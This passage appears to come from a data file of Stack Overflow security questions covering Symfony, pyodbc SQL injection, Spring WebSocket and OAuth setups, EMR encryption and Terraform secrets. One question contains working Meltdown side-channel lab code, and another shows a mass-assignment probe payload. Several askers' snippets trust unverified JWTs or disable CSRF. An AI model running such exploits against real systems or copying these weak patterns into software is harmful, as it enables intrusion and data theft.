    # Easy way to control access for large sections of your site
    # Note: Only the *first* access control that matches will be used
    access_control:
        # - { path: ^/admin, roles: ROLE_ADMIN }
        # - { path: ^/, roles: ROLE_USER }
        - { path: '^/', roles: PUBLIC_ACCESS, requires_channel: https }

when@test:
    security:
        password_hashers:
            # By default, password hashers are resource intensive and take time. This is
            # important to generate secure password hashes. In tests however, secure hashes
            # are not important, waste resources and increase test times. The following
            # reduces the work factor to the lowest possible values.
            Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface:
                algorithm: auto
                cost: 4 # Lowest possible value for bcrypt
                time_cost: 3 # Lowest possible value for argon
                memory_cost: 10 # Lowest possible value for argon

</code></pre>
<p>Its not very safe.</p>
<p>I dont understand how to fix this issue.</p>
"
"<p>I have very little knowledge about SQL injection, and there are probably other threats I am unaware of out there for stealing company data, how would I make this python code better in regards to security?</p>
<pre><code>merge_query = &quot;&quot;&quot;
MERGE INTO sql_table_name AS Target
USING (
    VALUES {}
) AS Source (transaction_year, month_num, month_name, price_nt)
ON Target.transaction_year = Source.transaction_year 
AND Target.month_num = Source.month_num
WHEN MATCHED AND (Target.month_name != Source.month_name OR Target.price_nt != Source.price_nt) THEN
    UPDATE SET Target.month_name = Source.month_name, Target.price_nt = Source.price_nt
WHEN NOT MATCHED THEN
    INSERT (transaction_year, month_num, month_name, price_nt) VALUES (Source.transaction_year, Source.month_num, Source.month_name, Source.price_nt);
&quot;&quot;&quot;.format(','.join(['(?,?,?,?)' for _ in range(len(data))]))

params = [item for sublist in data for item in sublist]

try:
    obj_crsr.execute(merge_query, params)

except Exception as e:
    obj_crsr.rollback()
    print(e)
    print(&quot;Transaction rolled back&quot;)

else:
    obj_cnxn.commit()
    obj_crsr.close()
    obj_cnxn.close()
</code></pre>
<p>This python code is given data in the following format:</p>
<pre><code>[(2023, M12,    December,   541.44),
(2023,  M11,    November,   486.64),
(2023,  M10,    October,    468.23),
(2023,  M09,    September,  478.80),
(2023,  M08,    August,     475.41)]
</code></pre>
<p>And then is converted to a list in the <em>params</em> variable.  That data looks like this:</p>
<pre><code>['2023', 'M12', 'December', '541.442', '2023', 'M11', 'November', '486.639', '2023', 'M10', 'October', '468.226', '2023', 'M09', 'September', '478.802', '2023', 'M08', 'August', '475.411']
</code></pre>
<p>This is the only method I have found to work when trying to merge data into an existing table using PYODBC.  I have heard of parameterizing the query or naming sql variables, but I don't know how to adapt existing examples/solution on stack overflow to my specific use case.  Any suggestions are appreciated.</p>
"
"<p>In any HTTP request, I managed to get the principal from the SecurityContextHolder.
But in case of a WS one, I can't.
Here is the code</p>
<pre class=""lang-java prettyprint-override""><code>    @Override
    protected Principal determineUser(ServerHttpRequest request, WebSocketHandler wsHandler, Map&lt;String, Object&gt; attributes) {
        String token = request.getURI().getQuery().substring(13);
        Base64.Decoder decoder = Base64.getUrlDecoder();
        String[] chunks = token.split(&quot;\\.&quot;);
        User user = null;
        try {
            String payload = new String(decoder.decode(chunks[1]));
            user = new ObjectMapper().readValue(payload, User.class);
            UsernamePasswordAuthenticationToken usernamePasswordAuthentication = new UsernamePasswordAuthenticationToken(user, null, user.getGrantedAuthorities());
            usernamePasswordAuthentication.setDetails(user);
            SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthentication);

        } catch (Exception ex) {
            System.out.println(ex);
        }
        Principal principal = SecurityContextHolder.getContext().getAuthentication();
        System.out.println(&quot;PRINCIPAL HANDSHAKE:&quot; + principal); //prints correctly my principal with all the data from the token
        return principal;
    }
</code></pre>
<p>Here is the configureClientInboudChannel. I always start with a null principal but in the end, it's correctly set.</p>
<pre class=""lang-java prettyprint-override""><code>@Override
    public void configureClientInboundChannel(ChannelRegistration registration) {
        registration.interceptors(new ChannelInterceptor() {

            @Override
            public Message&lt;?&gt; preSend(Message&lt;?&gt; message, MessageChannel channel) {
                System.out.println(++counter);
                Principal principal = SecurityContextHolder.getContext().getAuthentication();
                System.out.println(&quot;PRINCIPAL:&quot; + principal); // null so far

                StompHeaderAccessor accessor = MessageHeaderAccessor
                        .getAccessor(message, StompHeaderAccessor.class);
                ...

                Base64.Decoder decoder = Base64.getUrlDecoder();
                String[] chunks = jwt.split(&quot;\\.&quot;);
                try {
                    String payload = new String(decoder.decode(chunks[1]));
                    User user = new ObjectMapper().readValue(payload, User.class);
                    UsernamePasswordAuthenticationToken usernamePasswordAuthentication = new UsernamePasswordAuthenticationToken(user, null, user.getGrantedAuthorities());
                    usernamePasswordAuthentication.setDetails(user);
                    SecurityContextHolder.getContext().setAuthentication(usernamePasswordAuthentication);

                    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
                    
                    principal = SecurityContextHolder.getContext().getAuthentication();
                    System.out.println(&quot;PRINCIPAL:&quot; + principal); // shows correct logged in user
                    accessor.setUser(authentication);
                } catch (Exception ex) {
                    System.out.println(ex);
                }
                return message;
            }
        });
</code></pre>
<p>But in my Controller</p>
<pre class=""lang-java prettyprint-override""><code>    @MessageMapping(&quot;/hello&quot;)
    public Message hello(@Payload Message message, Principal principal) {
        System.out.println(&quot;PRINCIPAL TEST INJECTED: &quot; + principal); //prints the previous principal
        Principal retrievedPrincipal = SecurityContextHolder.getContext().getAuthentication();
        System.out.println(&quot;PRINCIPAL TEST RETRIEVED: &quot; + retrievedPrincipal); // is null, WHY????

        ...
    }
</code></pre>
"
"<p>I am creating EMR cluster 6.9.0 with Spark application via Terraform. If I disable In-Transit encryption, then my cluster is working fine and jobs are running successfully. Now, when I enable this encryption and provide .pem files in S3 location and provide the s3 path in the terraform configuration, my EMR cluster creation fails.</p>
<p>Terraform configuration:</p>
<pre><code>{
  &quot;EncryptionConfiguration&quot;: {
        &quot;EnableInTransitEncryption&quot;: true,
        &quot;EnableAtRestEncryption&quot;: true,
        &quot;InTransitEncryptionConfiguration&quot;: {
            &quot;TLSCertificateConfiguration&quot;: {
                &quot;CertificateProviderType&quot;: &quot;PEM&quot;,
                &quot;S3Object&quot;: &quot;arn:aws:s3:::sample-mybucket/certs/MyCerts.zip&quot;
            }
        },
       &quot;AtRestEncryptionConfiguration&quot;: {
            &quot;LocalDiskEncryptionConfiguration&quot;: {
                &quot;EnableEbsEncryption&quot;: true,
                &quot;EncryptionKeyProviderType&quot;: &quot;AwsKms&quot;,
                &quot;AwsKmsKey&quot;: &quot;arn:aws:kms:us-east-1:dummy:key/12345678-1234-1234-1234-123456789012&quot;
            }
       }
    }
}
</code></pre>
<p>It throws the below error.</p>
<pre><code>On the master instance (i-123456789), Invalid S3Provider: Failed to read the private key from /tmp/emr-encryption/privateKey.pem
</code></pre>
<p>I am not getting much information about the error. On the IAM role which run the terraform job as well as S3 bucket has permissions for each other.</p>
<p>IAM role permissions:</p>
<pre><code>{
  &quot;Sid&quot;: &quot;S3AllowReads&quot;,
  &quot;Effect&quot;: &quot;Allow&quot;,
  &quot;Action&quot;: [
     &quot;s3:Get*&quot;,
     &quot;s3:List*&quot;
  ],
  &quot;Resource&quot;: &quot;arn:aws:s3:::*mybucket*&quot;
}
</code></pre>
<p>I haven't specified this /tmp/emr-encryption path, I am assuming IAM role which is creating EMR cluster would download the file to this location. If the assumption is correct, then please clarify, is this the local path or hdfs path.</p>
<p>My S3 bucket has server-side encryption enabled with the same AWS KMS key which is provided in the LocalDiskEncryptionConfiguration and IAM role which is creating the cluster from Terraform has access to this KMS key.</p>
<p>I can also see in CloudTrail, that there are many errors against the following events</p>
<ol>
<li>GetBucketReplication -&gt; ReplicationConfigurationNotFoundError</li>
<li>GetBucketLifecycle -&gt; NoSuchLifecycleConfiguration</li>
<li>GetBucketCors -&gt; NoSuchCORSConfiguration</li>
<li>GetBucketObjectLockConfiguration -&gt; ObjectLockConfigurationNotFoundError</li>
<li>GetBucketWebsite -&gt; NoSuchWebsiteConfiguration</li>
</ol>
<p>If there is any more information that is required to fix this issue, please let me know. Am I missing some configuration in any of the xml configuration files (core-site, yarn-site etc) or the issue is somewhere else?</p>
<p>}</p>
"
"<p>I had to add filter classes to fix some vulnerabilities found in an application that can only run on Internet Explorer in the compatibility mode.</p>
<p>Post-deployment of the fixes, I am unable to see any of them being reflected in the application and the vulnerabilities are still present.</p>
<p>Is there any way I can know the reason why this is happening and whether it can be fixed?</p>
<p>Thanks in advance</p>
<p>Tried adding the filter classes to fix the vulnerabilities.</p>
<p>Expected the vulnerabilities to be solved.</p>
"
"<p>I have a Sveltekit application, which uses a IODC flow for login specifically an accesstoken when trying to call APIs.</p>
<p>The accessToken is available in all calls to the backend via cookies, however, cookies are not available when using websockets. I want to be able to transfer the cookie via the websocket protocol to the server, to validate that the user is authenticated.</p>
<p>When the page is loaded a store is created with the user's access token, which is accessible by the browser, meaning I can send it as the first message in the websocket protocol. The issue lies in when the access token expires, I need to reload the entire page to refresh the store as cookies are not accessible by the browser.</p>
<p>I need some mechanism that allows me to send the access token via the websocket protocol in a secure manner. How do I solve this?</p>
<p>My first thought was to make a backend API which simple returns the cookies and then updates the store, but I am pretty sure this has security issues.</p>
<p>I am struggling to find much information about how to make a secure websocket setup between browser and server.</p>
"
"<p>I am doing this out of an effort of independent research and I supposedly saw that Windows checks if my Camera has infrared capability so it can compute if the face represented to it for login or authentication is on a photo image or live face. Microsoft supposedly have a way of checking the distance of each component on the image presented to the camera, is this possible and how can I achieve the same with open cv</p>
<p>This check is supposed to make sure that the face presented to the web cam for biometrics is not a photo image of the owner which would pass the <strong>Eigen Vector</strong> check but it's actually an impostor trying to gain access to the device. The depth check is supposed to ensure that the distance of the nose and the eye on the face image presented to the camera is not the same or any other useful features. How do they do that?</p>
"
"<p>I am doing the Meltdown attack lab using Ubuntu 16.04 32-bit, and an old CPU (Intel i5 7th Gen). There is a secret value 83 stored in <code>0xfbce3000</code> by a kernel module, the user program cannot directly access its value</p>
<p>This is the core code of the attack</p>
<pre><code>char data = 99;
data = *(char*) 0xfbce3000; // this will not pass the privilege check, there will be an exception, but due to out-of-order execution in some CPUs, a few instructions after this will be executed, if the privilege check fails, the effect of those instructions will be removed, but the CPU cache will not be removed, so we can use it as a side channel
array[data * 4096 + 1024] += 1; // make array[data * 4096 + 1024] to be put in the CPU cache
</code></pre>
<p>I measured the time for accessing <code>array[i * 4096 + 1024]</code>, and looked for the one whose accessing time was smaller than 100 CPU cycles (this threshold is based on previous experiment, on my computer, accessing data from CPU cache will need 30-80 CPU cycles, while accessing data from main memory will need more than 200).</p>
<p>I ran the program for 1000 times, sometimes, only <code>array[0* 4096 + 1024]</code> was in the cache. Since neither of the initial value of data or the secret value is 0, I am wondering why <code>array[0* 4096 + 1024]</code> is in the cache</p>
<p>The value of <code>data</code> has never been to zero, but sometimes <code>array[0* 4096 + 1024]</code> is in the CPU cache, I don't know where this <code>0</code> comes from.</p>
<p>Here is a more detailed code</p>
<pre><code># define DELTA 1024

// this is used to handle the exception, so that the program will not crash when the privilege check fails
static sigjmp_buf jbuf;
static void catch_segv() {
    siglongjmp(jbuf, 1);
}

int main() {
    // Register a signal handler
    signal(SIGSEGV, catch_segv);

    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (i = 0; i &lt; 256; i++) array[i*4096 + DELTA] = 1;
    //flush the values of the array from cache
    for (i = 0; i &lt; 256; i++) _mm_clflush(&amp;array[i*4096 + DELTA]);

    if(sigsetjmp(jbuf, 1) == 0) {
        char data = 99;
        data = *(char*) 0xfbce3000;
        array[data * 4096 + 1024] += 1;
    }
    else {
        printf(&quot;Memory access violation!\n&quot;);
    }

    // reload array[i * 4096 + 1024] and measure the accessing time
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for(i = 0; i &lt; 256; i++){
        addr = &amp;array[i*4096 + DELTA];
        time1 = __rdtscp(&amp;junk);
        junk = *addr;
        time2 = __rdtscp(&amp;junk) - time1;
        if (time2 &lt;= 100){
            printf(&quot;array[%d*4096 + %d] is in cache.\n&quot;,i,DELTA);
            printf(&quot;The Secret = %d.\n&quot;,i);
        }
    }                 
    return 0;
}
</code></pre>
"
"<p>I'm using Spring Security tool in my project. When the project is started and localhost:8080 is accessed, login is mandatory. I read somewhere that once the application is stopped, the page shall logout automatically.</p>
<p>However, once the application is stopped and started again, on reloading the page localhost:8080, it remains logged in.</p>
<p>I was expecting that once the application is stopped and started again, upon attempting to access localhost:8080, login page should be displayed.</p>
<p>I tried using on incognito mode also expecting it might be due to cache however, it didn't logout.</p>
<p>Further, it asks to login the first time it is accessed on a new window and even parallel sessions are allowed.
It remains logged in unless /logout is used or, the browser window is closed.</p>
<p>I would appreciate if someone could also help in finding how to end the particular event or, track the event that is accessing the page.</p>
"
"<p>We are implementing a custom provider, and we would like to avoid storing sensitive values in Terraform state. Let's say we have:</p>
<pre><code>resource my_secret_resource {
  secret_value = var.secret_value
}
</code></pre>
<p>We know that it's possible to use <code>StateFunc</code> to store a transformation of this value. Let's say we do this:</p>
<pre><code>&quot;secret_value&quot;: {
  Type:      schema.TypeString,
  StateFunc: func stateFuncEncrypting(v interface{}) string {
    return encrypt(hash(v))   
  },
},
</code></pre>
<p>We don't want to just <code>hash</code>, because it's not very safe, but a good <code>encrypt</code> produces different values each time, thus confusing Terraform:</p>
<pre><code>$ terraform apply

...

╷
│ Error: Provider produced inconsistent final plan
│ 
│ When expanding the plan for my_secret_resource.test1 to include new values learned so far during apply, provider
│ &quot;xxx&quot; produced an invalid new value for .secret_value: was
│ cty.StringVal(&quot;TNwbQAAABBcHGEnvVmb...&quot;),
│ but now
│ cty.StringVal(&quot;xuwrHk5COAAAADAJewY...&quot;).
│ 
│ This is a bug in the provider, which should be reported in the provider's own issue tracker.
</code></pre>
<p>Is there any way to tweak <code>StateFunc</code>, <code>DiffSuppressFunc</code>, <code>CustomizeDiff</code> or other Terraform pieces, to accomplish this?</p>
<hr />
<p>Related posts:</p>
<ul>
<li><a href=""https://stackoverflow.com/questions/66163498/keeping-secrets-out-of-terraform-state"">Keeping secrets out of Terraform state</a></li>
<li><a href=""https://stackoverflow.com/questions/75292022/how-can-i-implement-it-using-diffsuppressfunc"">How can I implement it using DiffSuppressFunc()?</a></li>
</ul>
<p>Related TF issues:</p>
<ul>
<li><a href=""https://github.com/hashicorp/terraform/issues/30469"" rel=""nofollow noreferrer"">https://github.com/hashicorp/terraform/issues/30469</a></li>
<li><a href=""https://github.com/hashicorp/terraform/issues/516"" rel=""nofollow noreferrer"">https://github.com/hashicorp/terraform/issues/516</a></li>
</ul>
"
"<p>We use Owasp.CsrfGuard.js in  webapp project and got error OWASP CSRFGuard JavaScript was included from within an unauthorized domain!</p>
<p>One of the reason I have identified that, webapp is accessed using third party login application (Compass) and domain name of server where compass is installed is different from domain name of our webapp application. There is no configuration in compass other then url of webapp.</p>
<p>Not sure what could be the solution for this.</p>
"
"<p>I am working in website project in visual studio 2012. Here I have a web method which is taking single parameter. This method get called from <code>AutoCompleteExtender</code> control. Below is the code of it:</p>
<pre><code>&lt;asp:TextBox ID=&quot;txtsearch&quot; runat=&quot;server&quot; CssClass=&quot;form-control setvaluework&quot; MaxLength=&quot;4000&quot; /&gt;
   &lt;ajx:AutoCompleteExtender ID=&quot;AutoCompleteExtender1&quot; runat=&quot;server&quot; TargetControlID=&quot;txtsearch&quot; ServicePath=&quot;SearchWebService.asmx&quot; ServiceMethod=&quot;GetWorsList&quot;
   MinimumPrefixLength=&quot;1&quot; CompletionSetCount=&quot;20&quot; CompletionInterval=&quot;0&quot; EnableCaching=&quot;true&quot;  CompletionListElementID=&quot;autocompleteList&quot; &gt;
&lt;/ajx:AutoCompleteExtender&gt;`
</code></pre>
<p>&quot;GetWorsList&quot; is defined as follows:</p>
<pre class=""lang-cs prettyprint-override""><code>[WebMethod]
public List&lt;string&gt; GetWorsList(string prefixText)
{
    List&lt;string&gt; workNames = null;
    if (Validations.ValidWorkNoAjax(prefixText) == false)
    {
        return workNames;
    }
    else
    {
        if (con.State == ConnectionState.Closed)
        {
            con.Open();
        }

        System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(&quot;&quot;, con);
        cmd.Parameters.Add(&quot;@prefixText&quot;, SqlDbType.VarChar, 500).Value = &quot;%&quot; + prefixText + &quot;%&quot;;

        /*Some Code*/

        return workNames;
     }
}
</code></pre>
<p>I am working to protect this method from <code>API Mass Assignment</code>. In an audit scan this method gets exploited.When a POST request was made in a test scan following payload was used:</p>
<pre class=""lang-json prettyprint-override""><code>{
 &quot;prefixText&quot;: &quot;WL&quot;,
 &quot;count&quot;: 20,
 &quot;is_admin&quot;: true,
 &quot;is_sso&quot;: true,
 &quot;role&quot;: &quot;admin&quot;
}
</code></pre>
<p>and it returns 200 OK status, which should not be the case because function is taking only single input as <code>prefixText</code>.</p>
<p>I have searched regarding this and found that I have to</p>
<blockquote>
<p>avoid using functions that automatically bind client's input to code variables or internal objects.If applicable, explicitly define and enforce schema's for the input data payloads.</p>
</blockquote>
<p>To achieve this I tried following:</p>
<pre><code>public object GetWorsList(string prefixText)
{
    var requestStrings = HttpContext.Current.Request.QueryString;

    foreach (var item in requestStrings.AllKeys)
    {
        if (!item.Contains(&quot;prefixText&quot;) &amp;&amp; !item.Contains(&quot;count&quot;))
        {
           return BadRequest(&quot;Invalid Request&quot;);
        }
    }
}
</code></pre>
<p>I created a whitelist of parameters which will be accepted. If any other parameter is added by the attacker then this method will return the <code>BadRequest</code>. But again in a POST request this method is not working i.e. I am not getting <code>BadRequest</code>. I tested this in postman using following details:</p>
<p><code>http://localhost:6949/ewbms_bb/SearchWebService.asmx/GetWorsList</code> in POST request
The payload I sent is :</p>
<pre><code>{
 &quot;prefixText&quot;: &quot;WL&quot;,
 &quot;count&quot;: 20,
 &quot;is_admin&quot;: true,
 &quot;is_sso&quot;: true,
 &quot;role&quot;: &quot;admin&quot;
}
</code></pre>
<p>Using the above payload the method should return <code>BadRequest</code>, but it is giving status code <code>200 OK</code>.</p>
<p>I also tried creating a separate class like this:</p>
<pre class=""lang-cs prettyprint-override""><code>public class WorkSearchModel 
{
    public string prefixText { get; set; }
    public int Count { get; set; }
}
</code></pre>
<p>and used <code>WorkSearchModel</code> as my method parameter. When I test this using postman and also in localhost, I get the error : <code>There was an error processing the request.</code></p>
<p>Through my search on internet, I found that 'API Mass Assignment' is properly handled in Asp.Net Core, but in webform/website project I found no such result. Please give guidance.</p>
"
"<p>On my website I have a <code>referrer-policy: strict-origin-when-cross-origin</code> header in place for security purposes but also have a few links pointing to my subdomain.</p>
<p>On my subdomain I am trying to read the origin + path when someone navigates from a link on the main domain to my subdomain because I want to only allow them access when they went by a specific page on the main domain first.</p>
<p>I have read that the origin of a domain and subdomain are completely different so I am not able to obtain the complete URL looking at the headers on the subdomain. Is there a way to do this without sacrificing security or doing it by query params?</p>
"
"<p>I have situation that I have 2 oauth 2.0 authorization servers with different redirect_uri.</p>
<p>I want to hide this page where I need to pick which server I want and make redirect automatically base on scope.</p>
<p>Is it possible? I won't to show this page to an external client, he should be redirected properly without asking.</p>
<p>Spring boot, Spring security, oauth2</p>
"
"<p>I am working security on Spring boot 3 and I have a problem in the application, where it treats the ADMIN or USER user in the same way. For example in this case, although the USER is not allowed to enter the following URLs, the ADMIN user cannot enter either.</p>
<pre><code>  .requestMatchers(HttpMethod.POST, &quot;/api/v1/users&quot;).hasRole(&quot;USER&quot;)
  .requestMatchers(HttpMethod.DELETE, &quot;/api/v1/users/{id}&quot;).hasRole(&quot;USER&quot;)
</code></pre>
<p><strong>SecurityConfig.java (auth-server)</strong></p>
<pre><code>package com.bench.authserver.auth;

@Configuration
@EnableWebSecurity
@Slf4j
public class SecurityConfig {

    @Autowired
    private UserService userService;

    @Bean
    UserDetailsService userDetailsService() {
        return username -&gt; {
            User user = userService.findByUsername(username);
            if (user == null) {
                throw new UsernameNotFoundException(&quot;User &quot; + username + &quot; does not exists&quot;);
            }
            List&lt;GrantedAuthority&gt; authorities = user.getRoles()
                    .stream()
                    .map(rol -&gt; new SimpleGrantedAuthority(rol.getName()))
                    .peek(authority -&gt; log.info(&quot;Username: &quot;.concat(username).concat(&quot; &quot;).concat(&quot;rol: &quot; + authority.getAuthority())))
                    .collect(Collectors.toList());
            return new UserOauth(user.getUsername(), user.getPassword(),
                    true, true, true, true, authorities);
        };
    }


    @Bean
    public AuthenticationManager authenticationManager(AuthenticationConfiguration authenticationConfiguration) throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }

    @Bean
    public AuthenticationProvider authenticationProvider(){
        DaoAuthenticationProvider provider = new DaoAuthenticationProvider();
        provider.setUserDetailsService(userDetailsService());
        provider.setPasswordEncoder(passwordEncoder());
        return provider;
    }

    public BCryptPasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    @Order(1)
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http)
            throws Exception {
        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);
        http.getConfigurer(OAuth2AuthorizationServerConfigurer.class)
                .oidc(Customizer.withDefaults());    // Enable OpenID Connect 1.0
        http
                // Redirect to the login page when not authenticated from the
                // authorization endpoint
                .exceptionHandling((exceptions) -&gt; exceptions
                        .defaultAuthenticationEntryPointFor(
                                new LoginUrlAuthenticationEntryPoint(&quot;/login&quot;),
                                new MediaTypeRequestMatcher(MediaType.TEXT_HTML)
                        )
                )
                // Accept access tokens for User Info and/or Client Registration
                .oauth2ResourceServer((resourceServer) -&gt; resourceServer
                        .jwt(Customizer.withDefaults()));

        return http.build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(HttpSecurity http)
            throws Exception {
        http
                .authorizeHttpRequests((authorize) -&gt; authorize
                        .anyRequest().authenticated()
                )
                // Form login handles the redirect to the login page from the
                // authorization server filter chain
                .csrf(csrf -&gt; csrf.disable())
                .formLogin(Customizer.withDefaults());

        return http.build();
    }

    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient oidcClient = RegisteredClient.withId(UUID.randomUUID().toString())
                .clientId(&quot;frontend-app&quot;)
                .clientSecret(&quot;{noop}12345&quot;)
                .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
                .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
                .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
                .redirectUri(&quot;http://127.0.0.1:9000/login/oauth2/code/frontend-app&quot;)
                .redirectUri(&quot;http://127.0.0.1:9000/authorized&quot;)
                .postLogoutRedirectUri(&quot;http://127.0.0.1:9000/logout&quot;)
                .scope(&quot;read&quot;)
                .scope(&quot;write&quot;)
                .scope(OidcScopes.OPENID)
                .scope(OidcScopes.PROFILE)
                .clientSettings(ClientSettings.builder().requireAuthorizationConsent(false).build())
                .build();

        return new InMemoryRegisteredClientRepository(oidcClient);
    }

    @Bean
    public JWKSource&lt;SecurityContext&gt; jwkSource() {
        KeyPair keyPair = generateRsaKey();
        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();
        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();
        RSAKey rsaKey = new RSAKey.Builder(publicKey)
                .privateKey(privateKey)
                .keyID(UUID.randomUUID().toString())
                .build();
        JWKSet jwkSet = new JWKSet(rsaKey);
        return new ImmutableJWKSet&lt;&gt;(jwkSet);
    }

    private static KeyPair generateRsaKey() {
        KeyPair keyPair;
        try {
            KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;);
            keyPairGenerator.initialize(2048);
            keyPair = keyPairGenerator.generateKeyPair();
        } catch (Exception ex) {
            throw new IllegalStateException(ex);
        }
        return keyPair;
    }

    @Bean
    public JwtDecoder jwtDecoder(JWKSource&lt;SecurityContext&gt; jwkSource) {
        return OAuth2AuthorizationServerConfiguration.jwtDecoder(jwkSource);
    }

    @Bean
    public AuthorizationServerSettings authorizationServerSettings() {
        return AuthorizationServerSettings.builder().build();
    }

}
</code></pre>
<p><strong>SecurityConfig.java (ms-users)</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests((authHttp) -&gt; authHttp
                        .requestMatchers(HttpMethod.GET, &quot;/authorized&quot;).permitAll()
                        .requestMatchers(HttpMethod.GET, &quot;/&quot;, &quot;/static/**&quot;, &quot;/index.html&quot;, &quot;/api/v1/users/username/{username}&quot;).permitAll()
                        .requestMatchers(HttpMethod.GET, &quot;/&quot;).hasAnyAuthority(&quot;SCOPE_read&quot;, &quot;SCOPE_write&quot;)
                        .requestMatchers(HttpMethod.POST, &quot;/&quot;).hasAuthority(&quot;SCOPE_write&quot;)
                        .requestMatchers(HttpMethod.POST, &quot;/api/v1/users&quot;).hasRole(&quot;USER&quot;)
                        .requestMatchers(HttpMethod.DELETE, &quot;/api/v1/users/{id}&quot;).hasRole(&quot;USER&quot;)
                        .anyRequest().authenticated())
                .csrf(csrf -&gt; csrf.disable())
                .sessionManagement(session -&gt; session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
                .oauth2Login(login -&gt; login.loginPage(&quot;/oauth2/authorization/frontend-app&quot;))
                .oauth2Client(withDefaults())
                .oauth2ResourceServer(resourceServer -&gt; resourceServer.jwt(withDefaults()));
        return http.build();
    }
}
</code></pre>
<p><strong>JWT PAYLOAD:</strong></p>
<pre><code>{
  &quot;sub&quot;: &quot;gonzalo1.degenaro&quot;,
  &quot;aud&quot;: &quot;frontend-app&quot;,
  &quot;nbf&quot;: 1708105433,
  &quot;scope&quot;: [
    &quot;read&quot;,
    &quot;openid&quot;,
    &quot;profile&quot;,
    &quot;write&quot;
  ],
  &quot;iss&quot;: &quot;http://127.0.0.1:9000&quot;,
  &quot;exp&quot;: 1708105733,
  &quot;iat&quot;: 1708105433,
  &quot;jti&quot;: &quot;38bb9710-7415-4d2c-baac-0e3ce4ef75c6&quot;
}
</code></pre>
<p><strong>Error when I am a ROLE_ADMIN</strong></p>
<pre><code>org.springframework.security.access.AccessDeniedException: Access Denied
    at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:98) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.oauth2.client.web.OAuth2AuthorizationCodeGrantFilter.doFilterInternal(OAuth2AuthorizationCodeGrantFilter.java:183) ~[spring-security-oauth2-client-6.2.1.jar:6.2.1]
    at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
    at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
